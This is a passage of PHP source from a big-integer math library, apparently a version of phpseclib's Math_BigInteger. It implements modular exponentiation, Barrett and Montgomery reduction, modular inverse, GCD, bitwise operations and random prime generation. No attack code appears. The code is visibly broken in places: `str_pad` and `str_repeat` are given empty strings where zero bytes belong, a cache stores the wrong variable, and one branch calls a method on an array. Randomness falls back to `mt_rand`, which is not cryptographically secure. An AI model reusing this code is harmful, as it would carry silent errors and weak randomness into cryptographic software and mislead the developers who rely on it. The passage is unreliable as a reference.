        $temp->value = gmp_powm($this->value, $e->value, $n->value);
        return $this->_normalize($temp);
    }
    if ($this->compare(new Math_BigInteger()) < 0 || $this->compare($n) > 0) {
        list(, $temp) = $this->divide($n);
        return $temp->modPow($e, $n);
    }
    if (defined('MATH_BIGINTEGER_OPENSSL_ENABLED')) {
        $components = array('modulus' => $n->toBytes(true), 'publicExponent' => $e->toBytes(true));
        $components = array('modulus' => pack('Ca*a*', 2, $this->_encodeASN1Length(strlen($components['modulus'])), $components['modulus']), 'publicExponent' => pack('Ca*a*', 2, $this->_encodeASN1Length(strlen($components['publicExponent'])), $components['publicExponent']));
        $RSAPublicKey = pack('Ca*a*a*', 48, $this->_encodeASN1Length(strlen($components['modulus']) + strlen($components['publicExponent'])), $components['modulus'], $components['publicExponent']);
        $rsaOID = pack('H*', '300d06092a864886f70d0101010500');
        $RSAPublicKey = chr(0) . $RSAPublicKey;
        $RSAPublicKey = chr(3) . $this->_encodeASN1Length(strlen($RSAPublicKey)) . $RSAPublicKey;
        $encapsulated = pack('Ca*a*', 48, $this->_encodeASN1Length(strlen($rsaOID . $RSAPublicKey)), $rsaOID . $RSAPublicKey);
        $RSAPublicKey = "-----BEGIN PUBLIC KEY-----
" . chunk_split(base64_encode($encapsulated)) . '-----END PUBLIC KEY-----';
        $plaintext = str_pad($this->toBytes(), strlen($n->toBytes(true)) - 1, "", STR_PAD_LEFT);
        if (openssl_public_encrypt($plaintext, $result, $RSAPublicKey, OPENSSL_NO_PADDING)) {
            return new Math_BigInteger($result, 256);
        }
    }
    if (MATH_BIGINTEGER_MODE == MATH_BIGINTEGER_MODE_BCMATH) {
        $temp = new Math_BigInteger();
        $temp->value = bcpowmod($this->value, $e->value, $n->value, 0);
        return $this->_normalize($temp);
    }
    if (empty($e->value)) {
        $temp = new Math_BigInteger();
        $temp->value = array(1);
        return $this->_normalize($temp);
    }
    if ($e->value == array(1)) {
        list(, $temp) = $this->divide($n);
        return $this->_normalize($temp);
    }
    if ($e->value == array(2)) {
        $temp = new Math_BigInteger();
        $temp->value = $this->_square($this->value);
        list(, $temp) = $temp->divide($n);
        return $this->_normalize($temp);
    }
    return $this->_normalize($this->_slidingWindow($e, $n, MATH_BIGINTEGER_BARRETT));
    if ($n->value[0] & 1) {
        return $this->_normalize($this->_slidingWindow($e, $n, MATH_BIGINTEGER_MONTGOMERY));
    }
    for ($i = 0;$i < count($n->value);++$i) {
        if ($n->value[$i]) {
            $temp = decbin($n->value[$i]);
            $j = strlen($temp) - strrpos($temp, '1') - 1;
            $j+= 26 * $i;
            break;
        }
    }
    $mod1 = $n->copy();
    $mod1->_rshift($j);
    $mod2 = new Math_BigInteger();
    $mod2->value = array(1);
    $mod2->_lshift($j);
    $part1 = ($mod1->value != array(1)) ? $this->_slidingWindow($e, $mod1, MATH_BIGINTEGER_MONTGOMERY) : new Math_BigInteger();
    $part2 = $this->_slidingWindow($e, $mod2, MATH_BIGINTEGER_POWEROF2);
    $y1 = $mod2->modInverse($mod1);
    $y2 = $mod1->modInverse($mod2);
    $result = $part1->multiply($mod2);
    $result = $result->multiply($y1);
    $temp = $part2->multiply($mod1);
    $temp = $temp->multiply($y2);
    $result = $result->add($temp);
    list(, $result) = $result->divide($n);
    return $this->_normalize($result);
}
function powMod($e, $n) {
    return $this->modPow($e, $n);
}
function _slidingWindow($e, $n, $mode) {
    static $window_ranges = array(7, 25, 81, 241, 673, 1793);
    $e_value = $e->value;
    $e_length = count($e_value) - 1;
    $e_bits = decbin($e_value[$e_length]);
    for ($i = $e_length - 1;$i >= 0;--$i) {
        $e_bits.= str_pad(decbin($e_value[$i]), MATH_BIGINTEGER_BASE, '0', STR_PAD_LEFT);
    }
    $e_length = strlen($e_bits);
    for ($i = 0, $window_size = 1;$i < count($window_ranges) && $e_length > $window_ranges[$i];++$window_size, ++$i) {
    }
    $n_value = $n->value;
    $powers = array();
    $powers[1] = $this->_prepareReduce($this->value, $n_value, $mode);
    $powers[2] = $this->_squareReduce($powers[1], $n_value, $mode);
    $temp = 1 << ($window_size - 1);
    for ($i = 1;$i < $temp;++$i) {
        $i2 = $i << 1;
        $powers[$i2 + 1] = $this->_multiplyReduce($powers[$i2 - 1], $powers[2], $n_value, $mode);
    }
    $result = array(1);
    $result = $this->_prepareReduce($result, $n_value, $mode);
    for ($i = 0;$i < $e_length;) {
        if (!$e_bits[$i]) {
            $result = $this->_squareReduce($result, $n_value, $mode);
            ++$i;
        } else {
            for ($j = $window_size - 1;$j > 0;--$j) {
                if (!empty($e_bits[$i + $j])) {
                    break;
                }
            }
            for ($k = 0;$k <= $j;++$k) {
                $result = $this->_squareReduce($result, $n_value, $mode);
            }
            $result = $this->_multiplyReduce($result, $powers[bindec(substr($e_bits, $i, $j + 1)) ], $n_value, $mode);
            $i+= $j + 1;
        }
    }
    $temp = new Math_BigInteger();
    $temp->value = $this->_reduce($result, $n_value, $mode);
    return $temp;
}
function _reduce($x, $n, $mode) {
    switch ($mode) {
        case MATH_BIGINTEGER_MONTGOMERY:
            return $this->_montgomery($x, $n);
        case MATH_BIGINTEGER_BARRETT:
            return $this->_barrett($x, $n);
        case MATH_BIGINTEGER_POWEROF2:
            $lhs = new Math_BigInteger();
            $lhs->value = $x;
            $rhs = new Math_BigInteger();
            $rhs->value = $n;
            return $x->_mod2($n);
        case MATH_BIGINTEGER_CLASSIC:
            $lhs = new Math_BigInteger();
            $lhs->value = $x;
            $rhs = new Math_BigInteger();
            $rhs->value = $n;
            list(, $temp) = $lhs->divide($rhs);
            return $temp->value;
        case MATH_BIGINTEGER_NONE:
            return $x;
        default:
    }
}
function _prepareReduce($x, $n, $mode) {
    if ($mode == MATH_BIGINTEGER_MONTGOMERY) {
        return $this->_prepMontgomery($x, $n);
    }
    return $this->_reduce($x, $n, $mode);
}
function _multiplyReduce($x, $y, $n, $mode) {
    if ($mode == MATH_BIGINTEGER_MONTGOMERY) {
        return $this->_montgomeryMultiply($x, $y, $n);
    }
    $temp = $this->_multiply($x, false, $y, false);
    return $this->_reduce($temp[MATH_BIGINTEGER_VALUE], $n, $mode);
}
function _squareReduce($x, $n, $mode) {
    if ($mode == MATH_BIGINTEGER_MONTGOMERY) {
        return $this->_montgomeryMultiply($x, $x, $n);
    }
    return $this->_reduce($this->_square($x), $n, $mode);
}
function _mod2($n) {
    $temp = new Math_BigInteger();
    $temp->value = array(1);
    return $this->bitwise_and($n->subtract($temp));
}
function _barrett($n, $m) {
    static $cache = array(MATH_BIGINTEGER_VARIABLE => array(), MATH_BIGINTEGER_DATA => array());
    $m_length = count($m);
    if (count($n) > 2 * $m_length) {
        $lhs = new Math_BigInteger();
        $rhs = new Math_BigInteger();
        $lhs->value = $n;
        $rhs->value = $m;
        list(, $temp) = $lhs->divide($rhs);
        return $temp->value;
    }
    if ($m_length < 5) {
        return $this->_regularBarrett($n, $m);
    }
    if (($key = array_search($m, $cache[MATH_BIGINTEGER_VARIABLE])) === false) {
        $key = count($cache[MATH_BIGINTEGER_VARIABLE]);
        $cache[MATH_BIGINTEGER_VARIABLE][] = $m;
        $lhs = new Math_BigInteger();
        $lhs_value = & $lhs->value;
        $lhs_value = $this->_array_repeat(0, $m_length + ($m_length >> 1));
        $lhs_value[] = 1;
        $rhs = new Math_BigInteger();
        $rhs->value = $m;
        list($u, $m1) = $lhs->divide($rhs);
        $u = $u->value;
        $m1 = $m1->value;
        $cache[MATH_BIGINTEGER_DATA][] = array('u' => $u, 'm1' => $m1);
    } else {
        extract($cache[MATH_BIGINTEGER_DATA][$key]);
    }
    $cutoff = $m_length + ($m_length >> 1);
    $lsd = array_slice($n, 0, $cutoff);
    $msd = array_slice($n, $cutoff);
    $lsd = $this->_trim($lsd);
    $temp = $this->_multiply($msd, false, $m1, false);
    $n = $this->_add($lsd, false, $temp[MATH_BIGINTEGER_VALUE], false);
    if ($m_length & 1) {
        return $this->_regularBarrett($n[MATH_BIGINTEGER_VALUE], $m);
    }
    $temp = array_slice($n[MATH_BIGINTEGER_VALUE], $m_length - 1);
    $temp = $this->_multiply($temp, false, $u, false);
    $temp = array_slice($temp[MATH_BIGINTEGER_VALUE], ($m_length >> 1) + 1);
    $temp = $this->_multiply($temp, false, $m, false);
    $result = $this->_subtract($n[MATH_BIGINTEGER_VALUE], false, $temp[MATH_BIGINTEGER_VALUE], false);
    while ($this->_compare($result[MATH_BIGINTEGER_VALUE], $result[MATH_BIGINTEGER_SIGN], $m, false) >= 0) {
        $result = $this->_subtract($result[MATH_BIGINTEGER_VALUE], $result[MATH_BIGINTEGER_SIGN], $m, false);
    }
    return $result[MATH_BIGINTEGER_VALUE];
}
function _regularBarrett($x, $n) {
    static $cache = array(MATH_BIGINTEGER_VARIABLE => array(), MATH_BIGINTEGER_DATA => array());
    $n_length = count($n);
    if (count($x) > 2 * $n_length) {
        $lhs = new Math_BigInteger();
        $rhs = new Math_BigInteger();
        $lhs->value = $x;
        $rhs->value = $n;
        list(, $temp) = $lhs->divide($rhs);
        return $temp->value;
    }
    if (($key = array_search($n, $cache[MATH_BIGINTEGER_VARIABLE])) === false) {
        $key = count($cache[MATH_BIGINTEGER_VARIABLE]);
        $cache[MATH_BIGINTEGER_VARIABLE][] = $n;
        $lhs = new Math_BigInteger();
        $lhs_value = & $lhs->value;
        $lhs_value = $this->_array_repeat(0, 2 * $n_length);
        $lhs_value[] = 1;
        $rhs = new Math_BigInteger();
        $rhs->value = $n;
        list($temp,) = $lhs->divide($rhs);
        $cache[MATH_BIGINTEGER_DATA][] = $temp->value;
    }
    $temp = array_slice($x, $n_length - 1);
    $temp = $this->_multiply($temp, false, $cache[MATH_BIGINTEGER_DATA][$key], false);
    $temp = array_slice($temp[MATH_BIGINTEGER_VALUE], $n_length + 1);
    $result = array_slice($x, 0, $n_length + 1);
    $temp = $this->_multiplyLower($temp, false, $n, false, $n_length + 1);
    if ($this->_compare($result, false, $temp[MATH_BIGINTEGER_VALUE], $temp[MATH_BIGINTEGER_SIGN]) < 0) {
        $corrector_value = $this->_array_repeat(0, $n_length + 1);
        $corrector_value[count($corrector_value) ] = 1;
        $result = $this->_add($result, false, $corrector_value, false);
        $result = $result[MATH_BIGINTEGER_VALUE];
    }
    $result = $this->_subtract($result, false, $temp[MATH_BIGINTEGER_VALUE], $temp[MATH_BIGINTEGER_SIGN]);
    while ($this->_compare($result[MATH_BIGINTEGER_VALUE], $result[MATH_BIGINTEGER_SIGN], $n, false) > 0) {
        $result = $this->_subtract($result[MATH_BIGINTEGER_VALUE], $result[MATH_BIGINTEGER_SIGN], $n, false);
    }
    return $result[MATH_BIGINTEGER_VALUE];
}
function _multiplyLower($x_value, $x_negative, $y_value, $y_negative, $stop) {
    $x_length = count($x_value);
    $y_length = count($y_value);
    if (!$x_length || !$y_length) {
        return array(MATH_BIGINTEGER_VALUE => array(), MATH_BIGINTEGER_SIGN => false);
    }
    if ($x_length < $y_length) {
        $temp = $x_value;
        $x_value = $y_value;
        $y_value = $temp;
        $x_length = count($x_value);
        $y_length = count($y_value);
    }
    $product_value = $this->_array_repeat(0, $x_length + $y_length);
    $carry = 0;
    for ($j = 0;$j < $x_length;++$j) {
        $temp = $x_value[$j] * $y_value[0] + $carry;
        $carry = MATH_BIGINTEGER_BASE === 26 ? intval($temp / 0x4000000) : ($temp >> 31);
        $product_value[$j] = (int)($temp - MATH_BIGINTEGER_BASE_FULL * $carry);
    }
    if ($j < $stop) {
        $product_value[$j] = $carry;
    }
    for ($i = 1;$i < $y_length;++$i) {
        $carry = 0;
        for ($j = 0, $k = $i;$j < $x_length && $k < $stop;++$j, ++$k) {
            $temp = $product_value[$k] + $x_value[$j] * $y_value[$i] + $carry;
            $carry = MATH_BIGINTEGER_BASE === 26 ? intval($temp / 0x4000000) : ($temp >> 31);
            $product_value[$k] = (int)($temp - MATH_BIGINTEGER_BASE_FULL * $carry);
        }
        if ($k < $stop) {
            $product_value[$k] = $carry;
        }
    }
    return array(MATH_BIGINTEGER_VALUE => $this->_trim($product_value), MATH_BIGINTEGER_SIGN => $x_negative != $y_negative);
}
function _montgomery($x, $n) {
    static $cache = array(MATH_BIGINTEGER_VARIABLE => array(), MATH_BIGINTEGER_DATA => array());
    if (($key = array_search($n, $cache[MATH_BIGINTEGER_VARIABLE])) === false) {
        $key = count($cache[MATH_BIGINTEGER_VARIABLE]);
        $cache[MATH_BIGINTEGER_VARIABLE][] = $x;
        $cache[MATH_BIGINTEGER_DATA][] = $this->_modInverse67108864($n);
    }
    $k = count($n);
    $result = array(MATH_BIGINTEGER_VALUE => $x);
    for ($i = 0;$i < $k;++$i) {
        $temp = $result[MATH_BIGINTEGER_VALUE][$i] * $cache[MATH_BIGINTEGER_DATA][$key];
        $temp = $temp - MATH_BIGINTEGER_BASE_FULL * (MATH_BIGINTEGER_BASE === 26 ? intval($temp / 0x4000000) : ($temp >> 31));
        $temp = $this->_regularMultiply(array($temp), $n);
        $temp = array_merge($this->_array_repeat(0, $i), $temp);
        $result = $this->_add($result[MATH_BIGINTEGER_VALUE], false, $temp, false);
    }
    $result[MATH_BIGINTEGER_VALUE] = array_slice($result[MATH_BIGINTEGER_VALUE], $k);
    if ($this->_compare($result, false, $n, false) >= 0) {
        $result = $this->_subtract($result[MATH_BIGINTEGER_VALUE], false, $n, false);
    }
    return $result[MATH_BIGINTEGER_VALUE];
}
function _montgomeryMultiply($x, $y, $m) {
    $temp = $this->_multiply($x, false, $y, false);
    return $this->_montgomery($temp[MATH_BIGINTEGER_VALUE], $m);
    static $cache = array(MATH_BIGINTEGER_VARIABLE => array(), MATH_BIGINTEGER_DATA => array());
    if (($key = array_search($m, $cache[MATH_BIGINTEGER_VARIABLE])) === false) {
        $key = count($cache[MATH_BIGINTEGER_VARIABLE]);
        $cache[MATH_BIGINTEGER_VARIABLE][] = $m;
        $cache[MATH_BIGINTEGER_DATA][] = $this->_modInverse67108864($m);
    }
    $n = max(count($x), count($y), count($m));
    $x = array_pad($x, $n, 0);
    $y = array_pad($y, $n, 0);
    $m = array_pad($m, $n, 0);
    $a = array(MATH_BIGINTEGER_VALUE => $this->_array_repeat(0, $n + 1));
    for ($i = 0;$i < $n;++$i) {
        $temp = $a[MATH_BIGINTEGER_VALUE][0] + $x[$i] * $y[0];
        $temp = $temp - MATH_BIGINTEGER_BASE_FULL * (MATH_BIGINTEGER_BASE === 26 ? intval($temp / 0x4000000) : ($temp >> 31));
        $temp = $temp * $cache[MATH_BIGINTEGER_DATA][$key];
        $temp = $temp - MATH_BIGINTEGER_BASE_FULL * (MATH_BIGINTEGER_BASE === 26 ? intval($temp / 0x4000000) : ($temp >> 31));
        $temp = $this->_add($this->_regularMultiply(array($x[$i]), $y), false, $this->_regularMultiply(array($temp), $m), false);
        $a = $this->_add($a[MATH_BIGINTEGER_VALUE], false, $temp[MATH_BIGINTEGER_VALUE], false);
        $a[MATH_BIGINTEGER_VALUE] = array_slice($a[MATH_BIGINTEGER_VALUE], 1);
    }
    if ($this->_compare($a[MATH_BIGINTEGER_VALUE], false, $m, false) >= 0) {
        $a = $this->_subtract($a[MATH_BIGINTEGER_VALUE], false, $m, false);
    }
    return $a[MATH_BIGINTEGER_VALUE];
}
function _prepMontgomery($x, $n) {
    $lhs = new Math_BigInteger();
    $lhs->value = array_merge($this->_array_repeat(0, count($n)), $x);
    $rhs = new Math_BigInteger();
    $rhs->value = $n;
    list(, $temp) = $lhs->divide($rhs);
    return $temp->value;
}
function _modInverse67108864($x) {
    $x = - $x[0];
    $result = $x & 0x3;
    $result = ($result * (2 - $x * $result)) & 0xF;
    $result = ($result * (2 - ($x & 0xFF) * $result)) & 0xFF;
    $result = ($result * ((2 - ($x & 0xFFFF) * $result) & 0xFFFF)) & 0xFFFF;
    $result = fmod($result * (2 - fmod($x * $result, MATH_BIGINTEGER_BASE_FULL)), MATH_BIGINTEGER_BASE_FULL);
    return $result & MATH_BIGINTEGER_MAX_DIGIT;
}
function modInverse($n) {
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            $temp = new Math_BigInteger();
            $temp->value = gmp_invert($this->value, $n->value);
            return ($temp->value === false) ? false : $this->_normalize($temp);
    }
    static $zero, $one;
    if (!isset($zero)) {
        $zero = new Math_BigInteger();
        $one = new Math_BigInteger(1);
    }
    $n = $n->abs();
    if ($this->compare($zero) < 0) {
        $temp = $this->abs();
        $temp = $temp->modInverse($n);
        return $this->_normalize($n->subtract($temp));
    }
    extract($this->extendedGCD($n));
    if (!$gcd->equals($one)) {
        return false;
    }
    $x = $x->compare($zero) < 0 ? $x->add($n) : $x;
    return $this->compare($zero) < 0 ? $this->_normalize($n->subtract($x)) : $this->_normalize($x);
}
function extendedGCD($n) {
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            extract(gmp_gcdext($this->value, $n->value));
            return array('gcd' => $this->_normalize(new Math_BigInteger($g)), 'x' => $this->_normalize(new Math_BigInteger($s)), 'y' => $this->_normalize(new Math_BigInteger($t)));
        case MATH_BIGINTEGER_MODE_BCMATH:
            $u = $this->value;
            $v = $n->value;
            $a = '1';
            $b = '0';
            $c = '0';
            $d = '1';
            while (bccomp($v, '0', 0) != 0) {
                $q = bcdiv($u, $v, 0);
                $temp = $u;
                $u = $v;
                $v = bcsub($temp, bcmul($v, $q, 0), 0);
                $temp = $a;
                $a = $c;
                $c = bcsub($temp, bcmul($a, $q, 0), 0);
                $temp = $b;
                $b = $d;
                $d = bcsub($temp, bcmul($b, $q, 0), 0);
            }
            return array('gcd' => $this->_normalize(new Math_BigInteger($u)), 'x' => $this->_normalize(new Math_BigInteger($a)), 'y' => $this->_normalize(new Math_BigInteger($b)));
    }
    $y = $n->copy();
    $x = $this->copy();
    $g = new Math_BigInteger();
    $g->value = array(1);
    while (!(($x->value[0] & 1) || ($y->value[0] & 1))) {
        $x->_rshift(1);
        $y->_rshift(1);
        $g->_lshift(1);
    }
    $u = $x->copy();
    $v = $y->copy();
    $a = new Math_BigInteger();
    $b = new Math_BigInteger();
    $c = new Math_BigInteger();
    $d = new Math_BigInteger();
    $a->value = $d->value = $g->value = array(1);
    $b->value = $c->value = array();
    while (!empty($u->value)) {
        while (!($u->value[0] & 1)) {
            $u->_rshift(1);
            if ((!empty($a->value) && ($a->value[0] & 1)) || (!empty($b->value) && ($b->value[0] & 1))) {
                $a = $a->add($y);
                $b = $b->subtract($x);
            }
            $a->_rshift(1);
            $b->_rshift(1);
        }
        while (!($v->value[0] & 1)) {
            $v->_rshift(1);
            if ((!empty($d->value) && ($d->value[0] & 1)) || (!empty($c->value) && ($c->value[0] & 1))) {
                $c = $c->add($y);
                $d = $d->subtract($x);
            }
            $c->_rshift(1);
            $d->_rshift(1);
        }
        if ($u->compare($v) >= 0) {
            $u = $u->subtract($v);
            $a = $a->subtract($c);
            $b = $b->subtract($d);
        } else {
            $v = $v->subtract($u);
            $c = $c->subtract($a);
            $d = $d->subtract($b);
        }
    }
    return array('gcd' => $this->_normalize($g->multiply($v)), 'x' => $this->_normalize($c), 'y' => $this->_normalize($d));
}
function gcd($n) {
    extract($this->extendedGCD($n));
    return $gcd;
}
function abs() {
    $temp = new Math_BigInteger();
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            $temp->value = gmp_abs($this->value);
        break;
        case MATH_BIGINTEGER_MODE_BCMATH:
            $temp->value = (bccomp($this->value, '0', 0) < 0) ? substr($this->value, 1) : $this->value;
        break;
        default:
            $temp->value = $this->value;
    }
    return $temp;
}
function compare($y) {
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            return gmp_cmp($this->value, $y->value);
        case MATH_BIGINTEGER_MODE_BCMATH:
            return bccomp($this->value, $y->value, 0);
    }
    return $this->_compare($this->value, $this->is_negative, $y->value, $y->is_negative);
}
function _compare($x_value, $x_negative, $y_value, $y_negative) {
    if ($x_negative != $y_negative) {
        return (!$x_negative && $y_negative) ? 1 : -1;
    }
    $result = $x_negative ? -1 : 1;
    if (count($x_value) != count($y_value)) {
        return (count($x_value) > count($y_value)) ? $result : -$result;
    }
    $size = max(count($x_value), count($y_value));
    $x_value = array_pad($x_value, $size, 0);
    $y_value = array_pad($y_value, $size, 0);
    for ($i = count($x_value) - 1;$i >= 0;--$i) {
        if ($x_value[$i] != $y_value[$i]) {
            return ($x_value[$i] > $y_value[$i]) ? $result : -$result;
        }
    }
    return 0;
}
function equals($x) {
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            return gmp_cmp($this->value, $x->value) == 0;
        default:
            return $this->value === $x->value && $this->is_negative == $x->is_negative;
    }
}
function setPrecision($bits) {
    $this->precision = $bits;
    if (MATH_BIGINTEGER_MODE != MATH_BIGINTEGER_MODE_BCMATH) {
        $this->bitmask = new Math_BigInteger(chr((1 << ($bits & 0x7)) - 1) . str_repeat(chr(0xFF), $bits >> 3), 256);
    } else {
        $this->bitmask = new Math_BigInteger(bcpow('2', $bits, 0));
    }
    $temp = $this->_normalize($this);
    $this->value = $temp->value;
}
function bitwise_and($x) {
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            $temp = new Math_BigInteger();
            $temp->value = gmp_and($this->value, $x->value);
            return $this->_normalize($temp);
        case MATH_BIGINTEGER_MODE_BCMATH:
            $left = $this->toBytes();
            $right = $x->toBytes();
            $length = max(strlen($left), strlen($right));
            $left = str_pad($left, $length, chr(0), STR_PAD_LEFT);
            $right = str_pad($right, $length, chr(0), STR_PAD_LEFT);
            return $this->_normalize(new Math_BigInteger($left & $right, 256));
    }
    $result = $this->copy();
    $length = min(count($x->value), count($this->value));
    $result->value = array_slice($result->value, 0, $length);
    for ($i = 0;$i < $length;++$i) {
        $result->value[$i]&= $x->value[$i];
    }
    return $this->_normalize($result);
}
function bitwise_or($x) {
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            $temp = new Math_BigInteger();
            $temp->value = gmp_or($this->value, $x->value);
            return $this->_normalize($temp);
        case MATH_BIGINTEGER_MODE_BCMATH:
            $left = $this->toBytes();
            $right = $x->toBytes();
            $length = max(strlen($left), strlen($right));
            $left = str_pad($left, $length, chr(0), STR_PAD_LEFT);
            $right = str_pad($right, $length, chr(0), STR_PAD_LEFT);
            return $this->_normalize(new Math_BigInteger($left | $right, 256));
    }
    $length = max(count($this->value), count($x->value));
    $result = $this->copy();
    $result->value = array_pad($result->value, $length, 0);
    $x->value = array_pad($x->value, $length, 0);
    for ($i = 0;$i < $length;++$i) {
        $result->value[$i]|= $x->value[$i];
    }
    return $this->_normalize($result);
}
function bitwise_xor($x) {
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            $temp = new Math_BigInteger();
            $temp->value = gmp_xor($this->value, $x->value);
            return $this->_normalize($temp);
        case MATH_BIGINTEGER_MODE_BCMATH:
            $left = $this->toBytes();
            $right = $x->toBytes();
            $length = max(strlen($left), strlen($right));
            $left = str_pad($left, $length, chr(0), STR_PAD_LEFT);
            $right = str_pad($right, $length, chr(0), STR_PAD_LEFT);
            return $this->_normalize(new Math_BigInteger($left ^ $right, 256));
    }
    $length = max(count($this->value), count($x->value));
    $result = $this->copy();
    $result->value = array_pad($result->value, $length, 0);
    $x->value = array_pad($x->value, $length, 0);
    for ($i = 0;$i < $length;++$i) {
        $result->value[$i]^= $x->value[$i];
    }
    return $this->_normalize($result);
}
function bitwise_not() {
    $temp = $this->toBytes();
    if ($temp == '') {
        return '';
    }
    $pre_msb = decbin(ord($temp[0]));
    $temp = ~ $temp;
    $msb = decbin(ord($temp[0]));
    if (strlen($msb) == 8) {
        $msb = substr($msb, strpos($msb, '0'));
    }
    $temp[0] = chr(bindec($msb));
    $current_bits = strlen($pre_msb) + 8 * strlen($temp) - 8;
    $new_bits = $this->precision - $current_bits;
    if ($new_bits <= 0) {
        return $this->_normalize(new Math_BigInteger($temp, 256));
    }
    $leading_ones = chr((1 << ($new_bits & 0x7)) - 1) . str_repeat(chr(0xFF), $new_bits >> 3);
    $this->_base256_lshift($leading_ones, $current_bits);
    $temp = str_pad($temp, strlen($leading_ones), chr(0), STR_PAD_LEFT);
    return $this->_normalize(new Math_BigInteger($leading_ones | $temp, 256));
}
function bitwise_rightShift($shift) {
    $temp = new Math_BigInteger();
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            static $two;
            if (!isset($two)) {
                $two = gmp_init('2');
            }
            $temp->value = gmp_div_q($this->value, gmp_pow($two, $shift));
        break;
        case MATH_BIGINTEGER_MODE_BCMATH:
            $temp->value = bcdiv($this->value, bcpow('2', $shift, 0), 0);
        break;
        default:
            $temp->value = $this->value;
            $temp->_rshift($shift);
    }
    return $this->_normalize($temp);
}
function bitwise_leftShift($shift) {
    $temp = new Math_BigInteger();
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            static $two;
            if (!isset($two)) {
                $two = gmp_init('2');
            }
            $temp->value = gmp_mul($this->value, gmp_pow($two, $shift));
        break;
        case MATH_BIGINTEGER_MODE_BCMATH:
            $temp->value = bcmul($this->value, bcpow('2', $shift, 0), 0);
        break;
        default:
            $temp->value = $this->value;
            $temp->_lshift($shift);
    }
    return $this->_normalize($temp);
}
function bitwise_leftRotate($shift) {
    $bits = $this->toBytes();
    if ($this->precision > 0) {
        $precision = $this->precision;
        if (MATH_BIGINTEGER_MODE == MATH_BIGINTEGER_MODE_BCMATH) {
            $mask = $this->bitmask->subtract(new Math_BigInteger(1));
            $mask = $mask->toBytes();
        } else {
            $mask = $this->bitmask->toBytes();
        }
    } else {
        $temp = ord($bits[0]);
        for ($i = 0;$temp >> $i;++$i) {
        }
        $precision = 8 * strlen($bits) - 8 + $i;
        $mask = chr((1 << ($precision & 0x7)) - 1) . str_repeat(chr(0xFF), $precision >> 3);
    }
    if ($shift < 0) {
        $shift+= $precision;
    }
    $shift%= $precision;
    if (!$shift) {
        return $this->copy();
    }
    $left = $this->bitwise_leftShift($shift);
    $left = $left->bitwise_and(new Math_BigInteger($mask, 256));
    $right = $this->bitwise_rightShift($precision - $shift);
    $result = MATH_BIGINTEGER_MODE != MATH_BIGINTEGER_MODE_BCMATH ? $left->bitwise_or($right) : $left->add($right);
    return $this->_normalize($result);
}
function bitwise_rightRotate($shift) {
    return $this->bitwise_leftRotate(-$shift);
}
function setRandomGenerator($generator) {
}
function _random_number_helper($size) {
    if (function_exists('crypt_random_string')) {
        $random = crypt_random_string($size);
    } else {
        $random = '';
        if ($size & 1) {
            $random.= chr(mt_rand(0, 255));
        }
        $blocks = $size >> 1;
        for ($i = 0;$i < $blocks;++$i) {
            $random.= pack('n', mt_rand(0, 0xFFFF));
        }
    }
    return new Math_BigInteger($random, 256);
}
function random($arg1, $arg2 = false) {
    if ($arg1 === false) {
        return false;
    }
    if ($arg2 === false) {
        $max = $arg1;
        $min = $this;
    } else {
        $min = $arg1;
        $max = $arg2;
    }
    $compare = $max->compare($min);
    if (!$compare) {
        return $this->_normalize($min);
    } elseif ($compare < 0) {
        $temp = $max;
        $max = $min;
        $min = $temp;
    }
    static $one;
    if (!isset($one)) {
        $one = new Math_BigInteger(1);
    }
    $max = $max->subtract($min->subtract($one));
    $size = strlen(ltrim($max->toBytes(), chr(0)));
    $random_max = new Math_BigInteger(chr(1) . str_repeat("", $size), 256);
    $random = $this->_random_number_helper($size);
    list($max_multiple) = $random_max->divide($max);
    $max_multiple = $max_multiple->multiply($max);
    while ($random->compare($max_multiple) >= 0) {
        $random = $random->subtract($max_multiple);
        $random_max = $random_max->subtract($max_multiple);
        $random = $random->bitwise_leftShift(8);
        $random = $random->add($this->_random_number_helper(1));
        $random_max = $random_max->bitwise_leftShift(8);
        list($max_multiple) = $random_max->divide($max);
        $max_multiple = $max_multiple->multiply($max);
    }
    list(, $random) = $random->divide($max);
    return $this->_normalize($random->add($min));
}
function randomPrime($arg1, $arg2 = false, $timeout = false) {
    if ($arg1 === false) {
        return false;
    }
    if ($arg2 === false) {
        $max = $arg1;
        $min = $this;
    } else {
        $min = $arg1;
        $max = $arg2;
    }
    $compare = $max->compare($min);
    if (!$compare) {
        return $min->isPrime() ? $min : false;
    } elseif ($compare < 0) {
        $temp = $max;
        $max = $min;
        $min = $temp;
    }
    static $one, $two;
    if (!isset($one)) {
        $one = new Math_BigInteger(1);
        $two = new Math_BigInteger(2);
    }
    $start = time();
    $x = $this->random($min, $max);
    if (MATH_BIGINTEGER_MODE == MATH_BIGINTEGER_MODE_GMP && extension_loaded('gmp') && version_compare(PHP_VERSION, '5.2.0', '>=')) {
        $p = new Math_BigInteger();
        $p->value = gmp_nextprime($x->value);
        if ($p->compare($max) <= 0) {
            return $p;
        }
        if (!$min->equals($x)) {
            $x = $x->subtract($one);
        }
        return $x->randomPrime($min, $x);
    }
    if ($x->equals($two)) {
        return $x;
    }
    $x->_make_odd();
    if ($x->compare($max) > 0) {
        if ($min->equals($max)) {
            return false;
        }
        $x = $min->copy();
        $x->_make_odd();
    }
    $initial_x = $x->copy();
    while (true) {
        if ($timeout !== false && time() - $start > $timeout) {
            return false;
        }
        if ($x->isPrime()) {
            return $x;
        }
        $x = $x->add($two);
        if ($x->compare($max) > 0) {
            $x = $min->copy();
            if ($x->equals($two)) {
                return $x;
            }
            $x->_make_odd();
        }
        if ($x->equals($initial_x)) {
            return false;
        }
    }
}
function _make_odd() {
    switch (MATH_BIGINTEGER_MODE) {
        case MATH_BIGINTEGER_MODE_GMP:
            gmp_setbit($this->value, 0);
        break;
        case MATH_BIGINTEGER_MODE_BCMATH:
